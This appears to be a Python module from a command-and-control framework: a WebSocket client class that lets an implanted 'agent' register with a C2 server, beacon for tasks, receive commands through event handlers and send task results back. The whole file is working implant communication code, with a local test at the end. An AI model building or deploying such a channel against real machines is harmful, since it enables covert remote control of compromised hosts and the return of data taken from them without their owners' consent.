"""
WebSocket Protocol for C2 Communication
Real-time bidirectional communication
"""

import asyncio
import json
from typing import Dict, Optional, Callable
import logging

logger = logging.getLogger(__name__)


class WebSocketProtocol:
    """
    WebSocket C2 Protocol
    
    Features:
    - Real-time bidirectional communication
    - Persistent connection
    - Low latency
    - Event-driven architecture
    """
    
    def __init__(self, c2_url: str):
        self.c2_url = c2_url
        self.websocket = None
        self.connected = False
        self.message_handlers = {}
    
    async def connect(self) -> bool:
        """Connect to C2 WebSocket server"""
        
        try:
            import websockets
            
            self.websocket = await websockets.connect(self.c2_url)
            self.connected = True
            
            logger.info(f"[WebSocketProtocol] Connected to {self.c2_url}")
            
            return True
        
        except Exception as e:
            logger.error(f"[WebSocketProtocol] Connection error: {e}")
            self.connected = False
            return False
    
    async def disconnect(self):
        """Disconnect from C2 server"""
        
        if self.websocket:
            await self.websocket.close()
            self.connected = False
            
            logger.info("[WebSocketProtocol] Disconnected")
    
    async def send(self, data: Dict) -> bool:
        """Send data to C2 server"""
        
        if not self.connected or not self.websocket:
            logger.error("[WebSocketProtocol] Not connected")
            return False
        
        try:
            message = json.dumps(data)
            await self.websocket.send(message)
            
            logger.debug(f"[WebSocketProtocol] Sent: {data}")
            
            return True
        
        except Exception as e:
            logger.error(f"[WebSocketProtocol] Send error: {e}")
            return False
    
    async def receive(self) -> Optional[Dict]:
        """Receive data from C2 server"""
        
        if not self.connected or not self.websocket:
            logger.error("[WebSocketProtocol] Not connected")
            return None
        
        try:
            message = await self.websocket.recv()
            data = json.loads(message)
            
            logger.debug(f"[WebSocketProtocol] Received: {data}")
            
            return data
        
        except Exception as e:
            logger.error(f"[WebSocketProtocol] Receive error: {e}")
            return None
    
    def on(self, event: str, handler: Callable):
        """Register event handler"""
        
        self.message_handlers[event] = handler
    
    async def listen(self):
        """Listen for incoming messages"""
        
        if not self.connected:
            logger.error("[WebSocketProtocol] Not connected")
            return
        
        logger.info("[WebSocketProtocol] Listening for messages")
        
        try:
            while self.connected:
                data = await self.receive()
                
                if data:
                    event = data.get("event")
                    
                    if event and event in self.message_handlers:
                        # Call event handler
                        handler = self.message_handlers[event]
                        await handler(data)
        
        except Exception as e:
            logger.error(f"[WebSocketProtocol] Listen error: {e}")
            self.connected = False
    
    async def register_agent(self, agent_info: Dict) -> Optional[str]:
        """Register agent with C2 server"""
        
        await self.send({
            "event": "register",
            "data": agent_info
        })
        
        # Wait for response
        response = await self.receive()
        
        if response and response.get("event") == "registered":
            agent_id = response.get("data", {}).get("agent_id")
            logger.info(f"[WebSocketProtocol] Registered as {agent_id}")
            return agent_id
        
        return None
    
    async def beacon(self, agent_id: str) -> Optional[Dict]:
        """Send beacon"""
        
        await self.send({
            "event": "beacon",
            "agent_id": agent_id
        })
        
        # Wait for task
        response = await self.receive()
        
        if response and response.get("event") == "task":
            return response.get("data")
        
        return None
    
    async def submit_result(self, agent_id: str, task_id: str, result: Dict) -> bool:
        """Submit task result"""
        
        await self.send({
            "event": "result",
            "agent_id": agent_id,
            "task_id": task_id,
            "data": result
        })
        
        return True


# Standalone test
if __name__ == "__main__":
    async def main():
        protocol = WebSocketProtocol("ws://localhost:8000/ws")
        
        # Connect
        connected = await protocol.connect()
        
        if connected:
            # Register agent
            agent_id = await protocol.register_agent({
                "hostname": "test-host",
                "os": "Linux"
            })
            
            # Send beacon
            task = await protocol.beacon(agent_id)
            print(f"Task: {task}")
            
            # Disconnect
            await protocol.disconnect()
    
    asyncio.run(main())

